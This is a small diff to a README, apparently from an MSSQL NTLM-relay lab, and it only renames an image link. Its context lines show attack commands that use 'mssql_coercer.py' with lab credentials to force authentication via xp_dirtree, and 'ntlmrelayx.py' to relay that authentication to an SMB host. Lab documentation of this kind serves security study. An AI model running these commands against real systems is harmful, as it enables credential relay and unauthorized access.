@@ -15,4 +15,4 @@ python3 mssql_coercer.py ludus/sql-user1:'Passw0rd!'@dummy -windows-auth -ip-fil
 python3 ntlmrelayx.py -t smb://10.6.15.13 -smb2support
 ```
 
-![xp_dirtree coerced multiple](https://github.com/innxrmxst/mssql-relay-lab/blob/main/images/xp_dirtree_coerced_multiple.png)
+![xp_dirtree_coerce](https://github.com/innxrmxst/mssql-relay-lab/blob/main/images/xp_dirtree_coerce.png)
